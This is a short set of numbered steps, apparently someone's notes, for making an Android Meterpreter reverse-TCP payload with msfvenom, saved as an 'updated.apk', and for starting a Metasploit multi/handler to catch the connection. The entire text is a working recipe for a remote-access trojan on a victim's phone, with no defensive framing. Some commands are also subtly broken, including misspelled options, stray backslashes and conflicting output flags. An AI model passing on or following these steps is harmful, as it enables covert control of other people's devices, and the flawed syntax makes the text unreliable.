step 1: open MSF
msfconsole

step 2:
msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.116.128 
lport=7777 \ --platform android --arch dalvik \ AndroidMainfest.targetSdkVersion=31 \ 
-o updated.apk R > /home/kali/attack.apk

step 3: use exploit/multi/handler
step 4: set payload android/meterpreter/reverse_tcp
step 5: set lhost via cmd ipconfig Ideally, it would be (mobile IP).
step 6 set lport 7777 defined by yourself
